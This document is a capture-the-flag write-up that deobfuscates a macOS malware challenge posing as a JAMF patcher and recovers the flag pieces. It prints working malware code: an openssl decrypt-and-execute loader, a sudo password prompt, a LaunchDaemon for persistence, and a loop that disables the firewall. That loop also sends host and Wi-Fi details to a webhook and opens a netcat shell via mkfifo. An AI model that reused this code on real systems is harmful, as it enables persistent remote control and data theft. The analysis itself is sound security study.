## Stage 1

Extract Zsh script from `document.wflow`.

Because it's XML, `&` in the script is replace with `&amp;`,
so just reverse that back.
The same applies for `>` (`&gt;`) and `<` (`&lt;`).

You can immediately notice there's a big chunk of encrypted data!
Sending this to an ChatGPT would give little info (other than the obvious),
as it is made to do so.

There's suspicius piping to "`ls`" and "`tee`",
but if you evaluate the second line,
the first base64 encoded payload are `alias ls=xxd`.
Since this is Zsh, it would be evaluated (unlike bash),
and be run as a command.

The aliased `xxd` is then used to decrypt the next payload,
`alias tee=base64`, which is then executed as well.

Next, there's this encrypted `create_file` function.
After you decode it (through aliased `xxd` & `base64`),
it's apparently an character obfuscation technique through mapping.

```zsh
create_file() {
  for F in "$@"; do
    echo -n "$F " | tr '_qwertyuiopasdfghjklzxcvbnm1-90' '-1234567890qwertyuiopasdfghjklzxcvbnm'
  done
}
```

Look around,
and you'll see it's usage is to process obfuscated strings in the code.

If you haven't noticed,
the comments are just red herrings :>
By simply evaluating the deobfuscation process,
you can recover the `cat` command.

```zsh
# the patched jamf binary file in base64
(cat | >/tmp/dorime openssl enc -aes-256-cbc -base64 -d -pbkdf2 -k "JAMF_SCHOOL_UNSUPERVISED_MAC.mobileconfig") <<EOF
U2FsdGVkX18AsMRCnbtUl51DnmpHloEwuzTsz7DbuJQzdK3ebQz+WINhIQt31ChK
F9Bnqe0a+kqAscPv9fz8C7yRgc5x7yYdCu7GIBzzZEDFXBjuG96IGExYMRNZZOGQ
qtibP0UdfLPlSUud7Eh2QLetbI8KIblTjD3zqoJ653m48g0ul3Biv84wbsrIDjoK
sHIdXcD2sn+C8B0AVRN6bU26bPpxOjgAz7ObjpVgsOVmNjS47kfki91fhGMhyCE6
OjyubrpAj5NpA/R+LBfe81e0kpC42G2ogRzXJ9jYW4d/VTzktj3D8XHisL0OxO92
...continued...
```

You can just run this command and get the stage 2 of the malware.

The deobfuscated codes below this command
setup the decrypted 'jamf binary file' to be executable,
then run it,
and deleting it immediately after exit.

```zsh
chmod 755 /tmp/dorime
/tmp/dorime 2>/tmp/stderr_dorime >/tmp/stdout_dorime
rm /tmp/dorime
```

The lines below are just loggings info,
and doesn't contribute to much to the challenge.
Obviously, you can't decrypt them without having the private key.

## Stage 2

This time, it's a bash script.
You'll see a *presumably useless* comments,
but don't delete or tamper that yet :)

At first,
it checks for commands in the system,
and prompt the user for missing commands.
You can see some interesting commands there,
like `mkfifo`, `rev`, `/usr/libexec/ApplicationFirewall/socketfilterfw`, `launchctl`, `curl`, and `/usr/bin/nc`.
This whould warn you what this malware is about.

After that,
it asks for the user's system password.
Hey, it asks it before even checking for privilege level
(by using `sudo` to `ls` a root-only directory),
nasty!!  
`sudo -S` flag is used to 'extend' the sudo privilege timeout,
and is used for further malicious commands down the line.
Based on some logic,
it set the validity of the password (`true`/`unknown`/`wrong`).
If the password is wrong,
then it prompts the user for another password :p

### Part 2

Next, there's some obfuscated strings with `tr` and `rev`,
you can just that part to get the original code.
Here, it `curl` into `https://github.com/vinni3th3d4/CTF/raw/refs/heads/main/Cryptography/Provider.txt`,
The output of that gets deobfuscated again and stored into `dead`.
If you visit the **GitHub** repo,
One of the latest commit would contain the flag.

That's the second part of the flag.
Yes, they're obtained non-sequentially (don't complain) :>

### Part 4

If you decode what `curl` fetches,
it would be `https://webhook-test.com/39dd3c0398611e3b70c24a5f7ab39f21`.
If you try to access that directly,
you'll just make another GET request to the webhook.
Learn about the site,
and you'll learn that you can access the logs with
`https://webhook-test.com/?address=e494920866c67f6ff7ef820fd004b4d1`.
On the oldest request parameters,
you'll find the fourth piece of the flag.

### Back to Stage 2

Then, and public key is made in the system,
which then be used to encrypt the exfiltrated data to, something??
This part is heavily obfuscated.
But once again, since there's no indication you'll get the private key,
there's no point in trying to locate and decrypt this part.
Obvi, this is a red herring,
and one that would waste quite some time due to its obsessive obfuscation.

Or just `echo` the code itself xd,
it would just do the job for you :D
There are undefined variables,
that basically return nothing,
and only is there to create noise on the code.

``` zsh
$ echo ${fix_12398}c${jamf_12490}u${forever_17901}r${my_24237}l${love_20012} -X "${a4db05892b98590235f4c081cd571f4587ca398cb458661b4242b63869dcca00}P${c5feab709fa49df4eac85d640adfe15efb10670dfc2371b37863ab36f869be88}O${q0e8a3dcc377c3b025122522252e977e14aceaf8275f99d97fc10e585bea805d}S${bfe4c32946127d9f15e8b05c0222b3fb1127f2be6f6c7360662b3af722c529b3}T${a1e1af490006e0d30d9611522dc2740e86549eba76afd47283df27e9015010b5}" -H "Content-Type: application/json" -d '{"content":"'"${nevermore}"'"}' "${im_the_pain_within_your_head}${and_without_me_you_d_be}${dead}${im_the_reason_why}${you_ll_never_disappear}"
curl -X POST -H Content-Type: application/json -d {"content":""}
```

### Part 3

Below, there's a code that seems to create a file on the path
`/Library/LaunchDaemons/com.apple.networkfilter.plist` (`paper3`).
However, the RSA key is defined as `this="$(cat $0)"` and
`"${this:14:37}"`.
`$0` is the name (path) of the script,
and this means `this` would contain the content of this script itself.
It then uses Bash string slicing (`${var:idx:len}`) to get a part of the code.
Here, `\n` is treated as a character.
As such, `${this:14:37}` would evaluate to...
the top-most comment on the script!! :O  
This would retrieve `haven't you figured out how to smile?` as the decryption key!  
The commands after this `mv` the decrypted `.plist` to `/Library/LaunchDaemons`,
and then setting correct privileges and ownership for `launchctl` to load it.
It's minified,
but you can just use an [online beautifier](https://jsonformatter.org/xml-formatter) to get something like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
	<dict>
		<key>Label</key>
		<string>com.apple.networkfilter</string>
		<key>ProgramArguments</key>
		<array>
			<string>/bin/zsh</string>
			<string>/usr/local/bin/amenodorime</string>
		</array>
		<key>RunAtLoad</key>
		<true/>
		<key>KeepAlive</key>
		<true/>
	</dict>
</plist>
<!-- _1m_r357l355 -->
```

This is part 3, since a 'Daemons' is 'Demon' sound-alike :p
What this does is just create a daemon that launch on login,
to run `/usr/local/bin/amenodorime` with `zsh` (you'll see after this).

### Stage 3

There's another RSA encrypted payload,
and it uses the same key retrieval trick like in part 3.
It's just another `zsh` script...

```zsh
TMPF=$(mktemp -u);while true;do /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off;while ! ping -t 2 8.8.8.8;do true;done;DORIME=$(system_profiler SPAirPortDataType|awk -F':' '/Current Network Information:/{getline;sub(/^ */,"");sub(/:$/,"");print}'|base64);curl -X POST -H "Content-Type: application/json" -d '{"content":"WAKEUP:'"$(uname -n)"':'"$(ipconfig getifaddr en0)"':25448:'"$DORIME"'"}' "$(echo "$(curl -L "$(echo 'gkg.erqvibeC/lucnetbgcleP/avnz/fqnru/fsre/jne/SGP/4q3ug3vaavi/zbp.ohugvt//:fcggu'|tr 'n-za-mN-ZA-M' 'a-mn-zA-MN-Z'|rev)" 2>/dev/null)"|tr 'n-za-mN-ZA-M' 'a-mn-zA-MN-Z'|rev)";rm $TMPF;mkfifo $TMPF;cat $TMPF|/bin/zsh 2>&1|/usr/bin/nc -nvl 25448 >$TMPF;sleep 10;done;echo 7b3633375f776834375f7930755f77346e375f6e3077|xxd -r -p
```

Well, quite 'minified', so just beautify it and you'll get this:

```zsh
TMPF=$(mktemp -u)
while true; do
	/usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off
	while ! ping -t 2 8.8.8.8; do
		true
	done
	DORIME=$(system_profiler SPAirPortDataType|awk -F':' '/Current Network Information:/{getline;sub(/^ */,"");sub(/:$/,"");print}'|base64)
	curl -X POST -H "Content-Type: application/json" -d '{"content":"WAKEUP:'"$(uname -n)"':'"$(ipconfig getifaddr en0)"':25448:'"$DORIME"'"}' "$(echo "$(curl -L "$(echo 'gkg.erqvibeC/lucnetbgcleP/avnz/fqnru/fsre/jne/SGP/4q3ug3vaavi/zbp.ohugvt//:fcggu'|tr 'n-za-mN-ZA-M' 'a-mn-zA-MN-Z'|rev)" 2>/dev/null)"|tr 'n-za-mN-ZA-M' 'a-mn-zA-MN-Z'|rev)"
	rm $TMPF
	mkfifo $TMPF
	cat $TMPF|/bin/zsh 2>&1|/usr/bin/nc -nvl 25448 >$TMPF
	sleep 10
done
echo 7b3633375f776834375f7930755f77346e375f6e3077|xxd -r -p
```

It's a forever loop,
turning off the firewall,
checking for internet connection (with `ping`),
and sending `nc` listener connection info to the same webhook earlier.

### Part 1

On the last line is an unreachable code,
that simply print the freaking– FIRST part of the flag.

## JAMF Patching

After all that malware tomfoolery,
the actual promoted function of the patcher begins >:D

Fisrt of all,
it forcefully delete all configured profiles if even just JAMF is detected.
Then, it convert a 'property list' into xml `.mobileconfig` from an encoded base64 payload,
and then 'open' (simulate double-click) it.

This is NOT even patching kekw.

### Part 5

On the `.mobileconfig` file,
there's a `secretKey` variable which contain a base64 encoded string.
Decoding it would give the last part of the flag!! ^-^
(SORRY IF THIS FEELS GUESSY ;;)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>PayloadContent</key>
	<array>
		<dict>
			<key>PayloadContent</key>
			<dict>
				<key>com.jamf.trust</key>
				<dict>
					<key>Forced</key>
					<array>
						<dict>
							<key>mcx_preference_settings</key>
							<dict>
								<key>activationProfileUrl</key>
								<string>https://e.wandera.com/ax0xoz90-ms-jsl</string>
								<key>activationType</key>
								<string>AP</string>
								<key>apiKey</key>
								<string>9d710ed8-9ee2-40c9-9af9-e56242219af4</string>
								<key>externalId</key>
								<string>uem_42c9b7ee-d892-442a-b0e3-fc10fb9ef6d2_%managementId%</string>
								<key>secretKey</key>
								<string>X3kwdV9sbF82MzdfeTB1cl8wd25faDRwcDFuMzU1fQ==</string>
							</dict>
						</dict>
					</array>
				</dict>
			</dict>
			<!-- snip -->
		</dict>
		<!-- snip -->
	</array>
	<!-- snip -->
</dict>
</plist>
```

## Flag: `{637_wh47_y0u_w4n7_n0w_f0ll0w_m3_4r0und_1m_r357l355_c4ll_0u7_my_n4m3_n0w_y0u_ll_637_y0ur_0wn_h4pp1n355}`
